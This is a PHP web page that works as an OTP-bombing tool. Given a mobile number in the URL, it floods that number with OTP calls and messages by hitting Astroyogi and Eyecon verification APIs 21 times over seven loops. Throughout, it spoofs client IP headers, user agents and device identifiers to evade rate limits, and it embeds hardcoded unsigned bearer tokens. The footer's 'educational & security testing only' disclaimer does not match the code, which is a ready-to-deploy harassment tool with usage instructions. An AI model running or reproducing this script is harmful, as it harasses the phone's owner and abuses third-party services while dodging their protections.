<?php
error_reporting(0);

// Get mobile from URL parameter
$mobile = isset($_GET['mobile']) ? $_GET['mobile'] : '';

// ============ SPOOFING FUNCTIONS ============

function generateRandomIP() {
    return rand(1, 255) . '.' . rand(0, 255) . '.' . rand(0, 255) . '.' . rand(1, 255);
}

function generateRandomUserAgent() {
    $userAgents = [
        "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 14; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.130 Safari/537.36"
    ];
    return $userAgents[array_rand($userAgents)];
}

function generateDeviceId() {
    $chars = '0123456789abcdef';
    $id = '';
    for ($i = 0; $i < 16; $i++) {
        $id .= $chars[rand(0, 15)];
    }
    return $id;
}

function generateRequestId() {
    return bin2hex(random_bytes(8)) . '-' . bin2hex(random_bytes(4)) . '-' . 
           bin2hex(random_bytes(4)) . '-' . bin2hex(random_bytes(4)) . '-' . 
           bin2hex(random_bytes(12));
}

function buildSpoofedHeaders($randomIP, $additionalHeaders = []) {
    $headers = [
        "X-Forwarded-For: $randomIP",
        "Client-IP: $randomIP",
        "X-Real-IP: $randomIP",
        "True-Client-IP: $randomIP",
        "User-Agent: " . generateRandomUserAgent(),
        "Accept: application/json, text/plain, */*",
        "Accept-Language: en-IN,en-US,en;q=0.9",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        "Cache-Control: no-cache",
        "X-Device-ID: " . generateDeviceId()
    ];
    return array_merge($headers, $additionalHeaders);
}

function makeRequestSpoofed($method, $url, $data, $headers, $isFormData = false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    if (!empty($data)) {
        if ($isFormData) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
        }
    }
    
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_DNS_CACHE_TIMEOUT, 0);
    curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
    curl_setopt($ch, CURLOPT_FORBID_REUSE, true);
    
    usleep(rand(100000, 300000));
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return ["response" => $response, "httpCode" => $httpCode];
}

// ============ ASTROYOGI API - CALL ============

function sendOTP_AstroyogiCall($mobile) {
    $randomIP = generateRandomIP();
    $url = "https://comm.astroyogi.com/api/OtpComm/SendOtp";
    
    $data = [
        "countryCode" => "IN",
        "mobileNumber" => $mobile,
        "phoneCode" => "91",
        "phoneDeviceId" => generateDeviceId(),
        "platform" => "Android",
        "requestType" => "call"
    ];
    
    $headers = buildSpoofedHeaders($randomIP, [
        "Content-Type: application/json",
        "Accept: application/json",
        "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IlR0YUFwcFVzZXIiLCJFbnRpdHlJZCI6IjI3NDk4NDY1IiwiU291cmNlVXNlclR5cGUiOiJUdGFBcHBVc2VyIiwiU291cmNlRW50aXR5SWQiOiIyNzQ5ODQ2NSIsIm5iZiI6MTc3Njk1NzY3NCwiZXhwIjoxNzg0NzMzODU1fQ.",
        "versioncode: " . rand(500, 600),
        "devicetype: Android",
        "Origin: https://www.astroyogi.com",
        "Referer: https://www.astroyogi.com/"
    ]);
    
    return makeRequestSpoofed("POST", $url, $data, $headers);
}

// ============ ASTROYOGI API - WEB ============

function sendOTP_AstroyogiWeb($mobile) {
    $randomIP = generateRandomIP();
    $url = "https://comm.astroyogi.com/api/OtpComm/SendOtp";
    
    $data = [
        "phoneCode" => "91",
        "countryCode" => "IN",
        "mobileNumber" => $mobile,
        "platform" => "Web",
        "IpAddress" => $randomIP,
        "requestType" => "call",
        "countryCodeByHeader" => "IN"
    ];
    
    $headers = buildSpoofedHeaders($randomIP, [
        "Content-Type: application/json",
        "Accept: application/json",
        "authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzc2OTUyMTE3LCJleHAiOjE3ODQ3MjgxMTd9.",
        "Origin: https://www.astroyogi.com",
        "Referer: https://www.astroyogi.com/"
    ]);
    
    return makeRequestSpoofed("POST", $url, $data, $headers);
}

// ============ EYECON API ============

function sendOTP_Eyecon($mobile) {
    $randomIP = generateRandomIP();
    $deviceId = generateDeviceId();
    $advId = generateRequestId();
    $timestamp = (time() * 1000 + rand(0, 999));
    
    $url = "https://api.eyecon-app.com/app/cli_auth/gettransport";
    $params = [
        "cv" => "vc_" . rand(500, 600) . "_vn_4.2025.06." . rand(1, 30) . "." . rand(0, 9) . rand(0, 9) . "_a",
        "cli" => "91" . $mobile,
        "reg_id" => base64_encode(random_bytes(20)),
        "is_already_social_auth" => "false",
        "installer_name" => rand(0, 1) ? "Google%20Play" : "manually%2Bor%2Bunknown%2Bsource",
        "n_sims" => rand(1, 3),
        "time" => $timestamp,
        "is_sms_sending_available" => "true",
        "is_whatsapp_installed" => rand(0, 1) ? "true" : "false",
        "device_id" => $deviceId,
        "adv_id" => $advId,
        "time_zone" => "Asia%2FKolkata",
        "device_manu" => ["Xiaomi","Samsung","OnePlus","Google","OPPO"][array_rand(["Xiaomi","Samsung","OnePlus","Google","OPPO"])],
        "device_model" => ["POCO M2 Pro","Galaxy S23","OnePlus 11","Pixel 7","Find X5"][array_rand(["POCO M2 Pro","Galaxy S23","OnePlus 11","Pixel 7","Find X5"])]
    ];
    
    $url .= "?" . http_build_query($params);
    
    $headers = buildSpoofedHeaders($randomIP, [
        "Host: api.eyecon-app.com",
        "Connection: Keep-Alive",
        "Accept: */*"
    ]);
    
    return makeRequestSpoofed("GET", $url, "", $headers);
}

// ============ MAIN LOGIC WITH 7 LOOPS ============
if (!empty($mobile) && strlen($mobile) == 10) {
    $message = "OTP requests sent to $mobile (7 loops)";
    $results = [];
    $successCount = 0;
    $successCodes = [];

    for ($i = 1; $i <= 7; $i++) {
        $loopLabel = "Loop #$i";
        
        $results["$loopLabel - Astroyogi Call"] = sendOTP_AstroyogiCall($mobile);
        $results["$loopLabel - Astroyogi Web"] = sendOTP_AstroyogiWeb($mobile);
        $results["$loopLabel - Eyecon"] = sendOTP_Eyecon($mobile);
    }

    foreach ($results as $api => $result) {
        if ($result['httpCode'] >= 200 && $result['httpCode'] < 300) {
            $successCount++;
            if (count($successCodes) < 10) {
                $successCodes[] = $api;
            }
        }
    }

} else {
    $message = "Please enter a valid 10-digit mobile number";
    $results = [];
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Sender - Astroyogi Call/Web & Eyecon</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #0a0e17; padding: 20px; color: #fff; }
        .container { max-width: 1000px; margin: 0 auto; background: linear-gradient(145deg, #141b2d, #1a233a); padding: 30px; border-radius: 16px; border: 1px solid #2a3a5c; }
        h2 { color: #00d4ff; margin-bottom: 5px; }
        .subtitle { color: #8899bb; margin-bottom: 20px; }
        .badge { background: #00d4ff22; color: #00d4ff; padding: 4px 12px; border-radius: 20px; font-size: 12px; border: 1px solid #00d4ff44; }
        .usage { background: #0a0e17; padding: 12px; border-radius: 8px; margin: 15px 0; font-family: monospace; border: 1px solid #2a3a5c; color: #00d4ff; word-break: break-all; }
        form { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        input[type="text"] { flex: 1; min-width: 200px; padding: 14px 18px; border: 2px solid #2a3a5c; border-radius: 10px; background: #0a0e17; color: #fff; font-size: 16px; }
        input[type="text"]:focus { border-color: #00d4ff; outline: none; }
        button { padding: 14px 35px; background: linear-gradient(135deg, #00d4ff, #0088cc); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px #00d4ff44; }
        .message { padding: 14px; border-radius: 10px; margin: 15px 0; font-weight: 500; }
        .success { background: #00d4ff22; color: #00d4ff; border: 1px solid #00d4ff44; }
        .error { background: #ff444422; color: #ff6666; border: 1px solid #ff444444; }
        .results { margin-top: 25px; max-height: 600px; overflow-y: auto; }
        .result-item { background: #0a0e17; padding: 8px 12px; margin: 3px 0; border-radius: 6px; border-left: 3px solid #00d4ff; display: flex; flex-wrap: wrap; align-items: center; gap: 6px; font-size: 13px; }
        .result-item .api-name { font-weight: 600; color: #00d4ff; min-width: 180px; font-size: 12px; }
        .result-item .status { padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; }
        .status-200 { background: #00d4ff22; color: #00d4ff; border: 1px solid #00d4ff44; }
        .status-other { background: #ff444422; color: #ff6666; border: 1px solid #ff444444; }
        .result-item .response { font-size: 11px; color: #8899bb; flex: 1; word-break: break-all; min-width: 120px; }
        .summary { margin-top: 15px; padding: 16px; background: #0a0e17; border-radius: 10px; border: 1px solid #2a3a5c; }
        .summary strong { color: #00d4ff; }
        .loop-badge { background: #ff880022; color: #ff8800; padding: 2px 8px; border-radius: 10px; font-size: 10px; border: 1px solid #ff880044; margin-left: 8px; }
        .footer { text-align: center; margin-top: 30px; color: #445577; border-top: 1px solid #1a233a; padding-top: 20px; }
        .status-bar { background: #0a0e17; padding: 10px 16px; border-radius: 8px; margin: 10px 0; border: 1px solid #2a3a5c; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
        .status-bar span { color: #8899bb; }
        .status-bar strong { color: #00d4ff; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🚀 OTP Sender <span class="badge">Astroyogi Call/Web + Eyecon</span></h2>
        <p class="subtitle">3 APIs • 7 Loops • Full IP Spoofing</p>
        
        <div class="usage">
            <strong>➜ Usage:</strong> http://your-domain.com/kalki.php?mobile=XXXXXXXXXX
        </div>
        
        <form method="GET" action="">
            <input type="text" name="mobile" value="<?= htmlspecialchars($mobile) ?>" 
                   required pattern="^\d{10}$" placeholder="Enter 10-digit mobile number" maxlength="10">
            <button type="submit">⚡ Send OTP (7x)</button>
        </form>

        <?php if (isset($message)): ?>
            <div class="message <?= (!empty($mobile) && strlen($mobile) == 10) ? 'success' : 'error' ?>">
                <?= htmlspecialchars($message); ?>
            </div>
        <?php endif; ?>

        <?php if (!empty($results)): ?>
            <div class="status-bar">
                <span>📊 Total Requests: <strong><?= count($results); ?></strong></span>
                <span>✅ Success (2xx): <strong><?= $successCount; ?></strong></span>
                <span>📱 Mobile: <strong><?= htmlspecialchars($mobile); ?></strong></span>
            </div>
            
            <div class="results">
                <h3 style="color:#8899bb;font-size:14px;margin-bottom:10px;">📋 Results (<?= count($results) ?> requests):</h3>
                <?php foreach ($results as $api => $result): ?>
                    <div class="result-item">
                        <span class="api-name"><?= htmlspecialchars($api); ?></span>
                        <span class="status status-<?= ($result['httpCode'] >= 200 && $result['httpCode'] < 300) ? '200' : 'other' ?>">
                            <?= $result['httpCode']; ?>
                        </span>
                        <span class="response">
                            <?php 
                            $response = json_decode($result['response'], true);
                            if ($response && isset($response['message'])) {
                                echo htmlspecialchars(substr($response['message'], 0, 50));
                            } elseif ($response && isset($response['status'])) {
                                echo htmlspecialchars(substr($response['status'], 0, 50));
                            } elseif ($response && isset($response['errorMsg'])) {
                                echo htmlspecialchars(substr($response['errorMsg'], 0, 50));
                            } else {
                                echo htmlspecialchars(substr($result['response'], 0, 50));
                                if (strlen($result['response']) > 50) echo '...';
                            }
                            ?>
                        </span>
                        <?php if (strpos($api, 'Eyecon') !== false): ?>
                            <span class="loop-badge">👁️</span>
                        <?php endif; ?>
                        <?php if (strpos($api, 'Astroyogi') !== false): ?>
                            <span class="loop-badge">⭐</span>
                        <?php endif; ?>
                    </div>
                <?php endforeach; ?>
                <div class="summary">
                    ✅ <strong><?= $successCount; ?></strong> out of <strong><?= count($results); ?></strong> total requests responded with success (2xx)
                    <br><small style="font-weight:normal;color:#667799;">⏱️ 7 loops completed • Astroyogi Call + Astroyogi Web + Eyecon per loop</small>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="footer">
            <small>⚠️ For educational & security testing only. 7 loops of Astroyogi Call/Web + Eyecon APIs.</small>
        </div>
    </div>
</body>
</html>